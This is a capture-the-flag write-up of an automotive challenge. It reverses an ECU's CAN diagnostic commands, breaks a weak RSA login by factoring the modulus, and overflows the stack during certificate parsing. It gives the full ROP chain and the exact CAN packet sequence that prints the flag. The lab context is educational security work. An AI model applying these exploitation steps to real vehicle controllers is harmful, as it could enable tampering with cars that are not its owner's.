# Climate Controller Catastrophe
Catting cars is a major issue these days. It's impossible to sell your stolen car as a whole, so you sell it in parts. Dashboard computers are popular since they break quite often ;-).

Unfortunately, the dashboard computer is paired with the main computer. So, simply exchanging it will not do the trick. In fact, without the handshake to the main computer it will not operate the climate control buttons.

Of course just pairing the dashboard computer isn't cool enough, try to smash the stack instead! We suspect the device isn't using the serial interface for its pairing algorithm.

In addition to the attached challenge and reversing binaries, you're provided a special "challenge" which you can flash to wipe the EEPROM of your dashboard computer.

## Write-up
It was an interesting challenge, it was the challenge with more points and it mixed several disciplines: reversing, exploitation, can bus and encryption algorithms (I like the encryptions :smile:). When I resolved this challenge I didn't know the OBD and UDS protocols so I reversed the code of all commands to know how they worked. Later, when I resolved Auto-PSY, I read about them and I saw we had three UDS commands in this challenge.

### Reversing
 - There are two CAN IDs implemented in the challenge: 0665 and 0776 
 - The ID 0776 has one valid input: a certificate starting with 30 (and many other restrictions)
 - The ID 0665 has three valid commands: 27, 31, 3D
```
CMD27: It is a kind of login. It is needed to enable CMDs 31 and 3D.
It has two submodes (odd and even) according the value of the next byte (XX).
    ODD
       27 XX -> Set $20F1=5A, Set $25C4=0 and return 10 bytes with ID 0666 (67 XX&3F YYYYYYYYYYYYYYYY)
         $20F1 is a flag to enable EVEN mode
	     $25C4 is a counter of failed logins
	
	EVEN
	   27 XX ZZZZZZZZZZZZZZ -> Do 25C4++, check data and return 2 bytes with ID 0666 (67 XX&3F)
	      to check data it does a RSA:
		  DATA = ZZZZZZZZZZZZZZ (the data received in cmd 27 "even")
		  MODULUS = A59068FF
		  EXP = 7A69
	      The result must match with the data sent in the previous CMD 27 "odd"
	
	Example:
      -> 27 01
      <- 67 01 52 DA 4C 85 00 00 00 00
      -> 27 02 2B A2 91 9C 00 00 00 00
      <- 67 02
```
```
CMD31: Invalidate session key writing 16 bytes FF at NVM + 28
	31 01 43 01 -> return 5 bytes with ID 0666 (71 01 43 01 01)
```	
```
CMD3D: Write NVM 
	3D 02/12/22 OOOO LLLL XX...XX -> returns 6 bytes with ID 0666 (7D + the same data sent)
		02/12/22 = First nibble (0/1/2) is the length of LLLL, Second nibble (must be 2) is the length of OOOO
		OOOO = Address to write (from 0040 to 0441)
		LLLL = Length of data to write
		XX...XX = Data
```	
```
ERROR CODES DETECTED
11 -> If the cmd isn't 3D or 27 or 31
12 -> If the first byte of cmd31 isn't 01
13 -> If the length of cmd 27 "odd" is less than 02
      If the length of cmd 27 "even" is greater than 0A
      If the lenght of cmd 31 isn't 04
	  If the lenght of cmd 3D is less than 06
	  If the lenght of cmd 3D is less than the told in its first byte
22 -> If the high nibble of first byte of cmd3D isn't 0, 1 or 2
24 -> If there is a cmd 27 "even" and $20F1 isn't 5A (value set by cmd 27 "odd")
      If there is a cmd 27 "even" and $25C4 is greater than 3
31 -> If the second and third byte of cmd 31 aren't 43 01
      If the low nibble of first byte of cmd 3D isn't 2
33 -> If there is a cmd 3D or 31 and $20F0 isn't 3C
35 -> If the cmd 27 "even" values are incorrect and 25C4 is less than 4
36 -> If the cmd 27 "even" values are incorrect and 25C4 is greater or equal 4
```	
 - Here we find the first thing we can break... The login is using a RSA modulus very very small, we can factorize it and get the private exponent. A simple loop of least than 65535 iterations will give us one of the primes of modulus. We will find the primes 9C23 and 010F75 and calculate private exponent 29211341
```
P = 9C23
Q = 010F75
M = A59068FF
E = 7A69
D = 29211341	
```
 - The protocol to send data inside the CAN packets is a first packet with the format: "10 + LEN + 6 bytes of data" and next packets with format "2X + 7 bytes of data" (X is a counter from 0 to F starting with 1)
```
Example:
10 78 307631095269
21 73636172204341
22 810A4E49535420
23 502D3139328208
24 ABBA42C0FFEE13
25 378331048DAB11
26 E2D3A737E2D957
27 579FB8ABDD03C8
28 4F9BBAA89DC633
29 540354715A80A8
2A D029B6B387F2AC
2B 2FDB00ECA3CE0D
2C B7267E8420D900
2D 3CACAF5B935F9F
2E CB0F1765B0CF9B
2F D7A2A235CC03A6
20 FAD68DA834FC8E
21 2102
```
- During the initialization, the code checks the session and if it is invalidated then copy and validate a new certificate. During certificate validation function (6297) copy to the stack the three first tags of certificate, but it reserves a fix space of 0x64 bytes. Don't check the lengths so... if we write the NVM and increase the length of these tags... we could overwrite the stack!!! :smiling_imp:

- I also reversed all the code to process the packets to ID 0776 (Validations of certificate, Session generation, ECCDH, SHA256, ...) but it is not relevant to resolve the challenge. We can see an example of how it send the climate control settings at the end of this write-up.

### CAN Communication
To communicate with the board using CAN BUS I used [this setup](../CANOpener/CAN_Configuration.md)
The speed used in this challenge is 100Kbps (The CNF registers are configured with CNF3=05 CNF2=B8 CNF1=C4)

I prepared [this script](ClimateControllerCatastrophe.ino) to send commands to the CAN BUS using the COM port of the PC. It reads instructions from Serial, convert in CAN packet format, and send it over CAN BUS.
The format of the rs232 packets is IDID LLLL DDDD..DDDD, Example: 0665 0002 2701

### Exploitation
- The function 4E8F (inside it calls to 8BB8) prints the flag
- It checks many times if $210A==0x37 and $210B==ox13
- To avoid this checks we can jump directly inside the function after all the checks.
- I jumped to 4EB9 because I wanted to see the string **It's dangerous to go alone! take this.**
- The function 8BB8 needs r24=12, r25=72 and $2EF0=FF to print the flag correctly, so we need to prepare this values before jump to 4ED9
```
ROM:4ED9                 lds     r24, 211F
ROM:4EDB                 lds     r25, 2120
ROM:4EDD                 ldi     r22, 53 ; 'S'
ROM:4EDE                 ldi     r23, 23 ; '#'
ROM:4EDF                 call    printf         ; It's dangerous to go alone! take this.
ROM:4EE1                 ldd     r24, Y+1
ROM:4EE2                 ldd     r25, Y+2
ROM:4EE3                 call    writeFlag
```
- To write the address at $2EF0 we could use this piece of code:
```
ROM:8BB1                 ldd     r24, Y+1
ROM:8BB2                 sts     2EF0, r24
ROM:8BB4                 pop     r0
ROM:8BB5                 pop     r29
ROM:8BB6                 pop     r28
ROM:8BB7                 ret
```
- The end of function 6297 (where we can overwrite the stack) is this:
```
ROM:63DD                 pop     r29
ROM:63DE                 pop     r28
ROM:63DF                 ret
```
- We already have all the pieces, we only need to put all together. So, if we can write in the stack this code then we will get the flag:
```
yyyy 008BB1 FF xxxx 004ED9 1272  
  yyyy = pointer to the address of "B1" (just before the FF) to be loaded into r28 and r29 by the POP instructions before the ret  
  xxxx = pointer to the address of "49" (just before the 1272) to be loaded into r28 and r29 by the POP instructions before the ret  
```
1. the two pop before the ret of function 6297 will load r28:r29=yyyy (pointer to stack just before the FF value)
2. return to 008BB1
3. the opcode at 8BB1 will load r24=FF from stack, after will store it into $2FE0
4. then will pop the FF and load r28:r29=xxxx (pointer to stack just before the values 1272) 
5. return to 004ED9
6. the opcodes at 4EE1 and 4EE2 will load r24=12 and r25=72 from stack
7. Finally it will print the stack
	
- These are the packets sent to get the flag:
  - 0665 0002 2701                                                          -> Login Step 1 - Get Challenge
  - 0665 000A 2702 0FAF78600000000                                          -> Login Step 2 - Send Response
  - 0665 0004 31014301                                                      -> Invalidate session to force the validation of certification in next reset
  - 0665 0019 3D 22 B300 1300 A4090A08A03E 3E98 008BB1 FF 3E9E 004ED9 1272  -> Write in NVM los valores que queremos sobreescribir en el stack
  - 0665 0007 3D 22 4E00 0100 77                                            -> Increase the length of second tag of certificate 
  - 0665 0007 3D 22 4100 0100 86                                            -> Increase the length of certificate (to maintain the certificate valid)
  - Do Reset
```
Initializing...
It's dangerous to go alone! take this.cbe20e1984865e5fdb33f35c6b80001e
```


### Others 1
If we corrupt the eeprom by mistake, we can clear it flashing the file "clear_eeprom.hex" and running it. We will see this log:
```
Resetting EEPROM...
0%1%3%4%5%7%8%10%11%13%14%16%17%19%20%21%23%24%26%27%29%30%32%33%35%36%37%39%40%42%43%45%46%48%49%51%52%53%55%56%58%59%61%62%64%65%67%68%69%71%72%74%75%77%78%80%81%83%84%85%87%88%90%91%93%94%96%97%99%100%
Resetting complete
```

### Others 2
An example of packets of ID 0776
Send:
```
0776 0100 30FE8009526973636172204341810A4E49535420502D3139328208ABBA42C0FFEE13378331048DAB11E2D3A737E2D957579FB8ABDD03C84F9BBAA89DC6335403
54715A80A8D029B6B387F2AC2FDB00ECA3CE0DB7267E8420D9003CACAF5B935F9FCB0F1765B0CF9BD7A2A235CC03A6FAD68DA834FC8E21028586000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```
```
Log of my arduino script:

Serial message received:
30FE8009526973636172204341810A4E49535420502D3139328208ABBA42C0FFEE13378331048DAB11E2D3A737E2D957579FB8ABDD03C84F9BBAA89DC633540354715A80A8D029B6B387F2AC2FDB00ECA3CE0DB7267E8420D9003CACAF5B935F9FCB0F1765B0CF9BD7A2A235CC03A6FAD68DA834FC8E210285860000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Sending to CAN...
 - ID: 0776   LEN: 8   DATA: 110030FE80095269
 - ID: 0776   LEN: 8   DATA: 2173636172204341
 - ID: 0776   LEN: 8   DATA: 22810A4E49535420
 - ID: 0776   LEN: 8   DATA: 23502D3139328208
 - ID: 0776   LEN: 8   DATA: 24ABBA42C0FFEE13
 - ID: 0776   LEN: 8   DATA: 25378331048DAB11
 - ID: 0776   LEN: 8   DATA: 26E2D3A737E2D957
 - ID: 0776   LEN: 8   DATA: 27579FB8ABDD03C8
 - ID: 0776   LEN: 8   DATA: 284F9BBAA89DC633
 - ID: 0776   LEN: 8   DATA: 29540354715A80A8
 - ID: 0776   LEN: 8   DATA: 2AD029B6B387F2AC
 - ID: 0776   LEN: 8   DATA: 2B2FDB00ECA3CE0D
 - ID: 0776   LEN: 8   DATA: 2CB7267E8420D900
 - ID: 0776   LEN: 8   DATA: 2D3CACAF5B935F9F
 - ID: 0776   LEN: 8   DATA: 2ECB0F1765B0CF9B
 - ID: 0776   LEN: 8   DATA: 2FD7A2A235CC03A6
 - ID: 0776   LEN: 8   DATA: 20FAD68DA834FC8E
 - ID: 0776   LEN: 8   DATA: 2121028586000000
 - ID: 0776   LEN: 8   DATA: 2200000000000000
 - ID: 0776   LEN: 8   DATA: 2300000000000000
 - ID: 0776   LEN: 8   DATA: 2400000000000000
 - ID: 0776   LEN: 8   DATA: 2500000000000000
 - ID: 0776   LEN: 8   DATA: 2600000000000000
 - ID: 0776   LEN: 8   DATA: 2700000000000000
 - ID: 0776   LEN: 8   DATA: 2800000000000000
 - ID: 0776   LEN: 8   DATA: 2900000000000000
 - ID: 0776   LEN: 8   DATA: 2A00000000000000
 - ID: 0776   LEN: 8   DATA: 2B00000000000000
 - ID: 0776   LEN: 8   DATA: 2C00000000000000
 - ID: 0776   LEN: 8   DATA: 2D00000000000000
 - ID: 0776   LEN: 8   DATA: 2E00000000000000
 - ID: 0776   LEN: 8   DATA: 2F00000000000000
 - ID: 0776   LEN: 8   DATA: 2000000000000000
 - ID: 0776   LEN: 8   DATA: 2100000000000000
 - ID: 0776   LEN: 8   DATA: 2200000000000000
 - ID: 0776   LEN: 8   DATA: 2300000000000000
 - ID: 0776   LEN: 6   DATA: 240000000000
Sent!
```
And Serial port will receive **Session key initialized**. The session key generated is 11611BE96F4E2558EBC169A0C8DE2C3F
	
Send: 
```
0776 0001 00
```
```	
Log of my arduino script:

Serial message received:
00
Sending to CAN...
 - ID: 0776   LEN: 3   DATA: 100100
Sent!

CAN msg received -> ID: 1FF   LEN: 8   DATA: 1025640D255032D0
CAN msg received -> ID: 1FF   LEN: 8   DATA: 215D053E0ABE5FD3
CAN msg received -> ID: 1FF   LEN: 8   DATA: 22B050679AD2844F
CAN msg received -> ID: 1FF   LEN: 8   DATA: 23FE1338A3202F22
CAN msg received -> ID: 1FF   LEN: 8   DATA: 240CAC266EB963F5
CAN msg received -> ID: 1FF   LEN: 4   DATA: 253C3E49
```	
And Serial port will receive **Message received, sharing climate control settings.**. The data is 640D255032 D05D053E0ABE5FD3B050679AD2844FFE1338A3202F220CAC266EB963F53C3E49 (HMAC is correct)


### Others 1
NVM data loaded during initialization
```
1000: xx
1001: AB BA 42 C0 FF EE 13 37 -> Values checked during initialization
1009: xx
100A: C4 4A BF 3B A6 C1 F6 0F C4 B7 30 D8 2E 36 94 BF 13 1D 10 2C 0B 5A 2D DE 
1022: xx xx xx xx xx xx
1028: AB 7C DF B4 C4 64 DC D7 91 13 6B 5D 33 C6 22 71 -> Session key, it must be all FF to invalidate
1038: xx xx xx xx xx xx xx xx
1040: 30 76 80 09 52 69 73 63 61 72 20 43 41 81 0A 4E
      49 53 54 20 50 2D 31 39 32 82 08 AB BA 42 C0 FF 
      EE 13 37 83 31 04 8D AB 11 E2 D3 A7 37 E2 D9 57 
      57 9F B8 AB DD 03 C8 4F 9B BA A8 9D C6 33 54 03 
      54 71 5A 80 A8 D0 29 B6 B3 87 F2 AC 2F DB 00 EC 
      A3 CE 0D B7 26 7E 84 20 D9 00 3C AC AF 5B 93 5F 
      9F CB 0F 17 65 B0 CF 9B D7 A2 A2 35 CC 03 A6 FA 
      D6 8D A8 34 FC 8E 21 02

Details of certificate    
30 76 
   80 09 526973636172204341 - Riscar CA
   81 0A 4E49535420502D313932 - NIST P-192
   82 08 ABBA42C0FFEE1337 
   83 31 04 8DAB11E2D3A737E2D957579FB8ABDD03C84F9BBAA89DC633 540354715A80A8D029B6B387F2AC2FDB00ECA3CE0DB7267E
   84 20 D9003CACAF5B935F9FCB0F1765B0CF9BD7A2A235CC03A6FAD68DA834FC8E2102			
```